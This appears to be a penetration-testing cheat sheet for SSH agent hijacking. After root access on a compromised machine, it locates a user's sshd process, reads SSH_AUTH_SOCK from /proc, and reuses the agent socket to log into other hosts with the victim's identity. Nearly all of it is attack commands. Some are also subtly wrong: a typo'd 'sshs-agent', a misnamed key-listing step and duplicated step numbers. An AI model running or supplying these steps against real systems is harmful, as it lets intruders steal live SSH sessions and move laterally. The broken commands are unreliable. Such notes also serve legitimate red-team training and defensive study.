# ------------------------------- start overview ------------------------------- # 
    ==> Quick View: one of the methods we can explore for lateral movement which is gaining some
    attention recently.
    In order for this method be successful, the compromised machine should have an active SSH session
    established to another machine via "Public Key Authenticaion"
    we need to root privilege on the compromised system, will help to compromise the ssh agent or access
    the the ssh agent's unix domain socket and hijack the conneciton.
# ------------------------------- start overview ------------------------------- # 

# ------------------------------- start ssh hijacking attack ------------------------------- # 
    1st: ps aux | grep sshd
         ps aux | grep ssh          # OR
        ==> explanation: determine SSH process id of the user on the compromised host.
    2nd: grep SSH_AUTH_SOCK /proc/<PID>/environ
         cat /proc/<PID>/environ | tr '\0' '\n' | grep SSH_AUTH_SOCK    # OR
        ==> explanation: determine the SSH_AUTH_SOCK environment variable for sshd PID.
    3rd: SSH_AUTH_SOCK=<PREVIOUS_CAPTURE> sshs-agent
    3rd: SSH_AUTH_SOCK=<PREVIOUS_CAPTURE> ssh-agent -l  # OR
         SSH_AUTH_SOCK=<PREVIOUS_CAPTURE> ssh           # OR
            ==> explanation: you can test that the capture is working and an identity is
                present by running the following command, which should show
                the same fingerprint for the identity.
    4th: SSH_AUTH_SOCK=<PREVIOUS_CAPTURE> ssh <user>@<host_ip>
        ==> explanation: now use the ssh identity to access a remote instance where
                         you know the identity is in the authorized_keys file - to test
                         easily, you can simply use 'localhost' instead of host_ip since this host has
                         the identity in the authorized_keys file.
# -------------------------------   end ssh hijacking attack ------------------------------- # 